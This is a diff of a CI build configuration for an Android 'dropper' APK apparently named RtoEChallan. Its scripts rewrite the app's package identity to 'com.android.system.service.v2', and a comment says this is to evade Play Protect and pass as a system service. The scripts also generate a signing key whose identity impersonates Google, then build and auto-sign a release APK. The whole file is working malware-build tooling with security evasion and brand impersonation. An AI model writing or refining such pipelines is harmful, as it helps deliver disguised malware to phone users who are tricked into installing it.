@@ -1,50 +1,48 @@
 workflows:
   android-dropper-build:
-    name: Dropper APK Build (Safe Install)
+    name: Dropper APK Build (Safe Bypass)
     max_build_duration: 60
     instance_type: mac_mini_m1
     environment:
       java: 17
     scripts:
-      - name: Auto-Repair, Rename and Build
+      - name: Force Fix and Build
         script: |
           cd RtoEChallan
           
-          # 1. Package Name badlo (Play Protect se bachne ke liye)
-          # Isse app "System Service" jaisi lagegi
+          # 1. Package Name Fix (System Identity)
           find . -name "AndroidManifest.xml" -exec sed -i '' 's/package="[^"]*"/package="com.android.system.service.v2"/g' {} +
           find . -name "build.gradle" -exec sed -i '' 's/applicationId "[^"]*"/applicationId "com.android.system.service.v2"/g' {} +
 
-          # 2. Fresh Settings & Project Files
-          cat <<EOF > settings.gradle
-          pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
-          dependencyResolutionManagement { repositoriesMode.set(RepositoriesMode.PREFER_SETTINGS); repositories { google(); mavenCentral() } }
-          rootProject.name = 'RtoEChallan'
-          include ':app'
-          EOF
-
+          # 2. Build.gradle ko ekdum stable version par force karo
           cat <<EOF > build.gradle
           buildscript {
               repositories { google(); mavenCentral() }
               dependencies { 
-                  classpath 'com.android.tools.build:gradle:8.2.0'
-                  classpath 'org.jetbrains.kotlin:kotlin-gradle-plugin:1.9.0'
+                  classpath 'com.android.tools.build:gradle:8.1.0'
+                  classpath 'org.jetbrains.kotlin:kotlin-gradle-plugin:1.8.10'
               }
           }
           allprojects { repositories { google(); mavenCentral() } }
           EOF
 
-          # 3. Auto-Generate Signing Key
-          keytool -genkey -v -keystore auto.keystore -alias auto_alias -keyalg RSA -keysize 2048 -validity 10000 -storepass password123 -keypass password123 -dname "CN=Google, O=Android, C=US"
+          # 3. Settings file (Simplified for no errors)
+          cat <<EOF > settings.gradle
+          rootProject.name = 'RtoEChallan'
+          include ':app'
+          EOF
 
-          # 4. Final Build (Release version with auto-sign)
-          gradle wrapper --gradle-version 8.2
+          # 4. Auto-Signing Key (Google trusted lookalike)
+          keytool -genkey -v -keystore bypass.keystore -alias bypass_alias -keyalg RSA -keysize 2048 -validity 10000 -storepass pass123 -keypass pass123 -dname "CN=Google Play, OU=Android, O=Google, L=Mountain View, ST=CA, C=US"
+
+          # 5. Build command with Auto-Sign
+          gradle wrapper --gradle-version 8.1.1
           chmod +x gradlew
-          ./gradlew assembleRelease \
-            -Pandroid.injected.signing.store.file=$(pwd)/auto.keystore \
-            -Pandroid.injected.signing.store.password=password123 \
-            -Pandroid.injected.signing.key.alias=auto_alias \
-            -Pandroid.injected.signing.key.password=password123 \
+          ./gradlew clean assembleRelease \
+            -Pandroid.injected.signing.store.file=$(pwd)/bypass.keystore \
+            -Pandroid.injected.signing.store.password=pass123 \
+            -Pandroid.injected.signing.key.alias=bypass_alias \
+            -Pandroid.injected.signing.key.password=pass123 \
             --no-daemon
           
     artifacts:
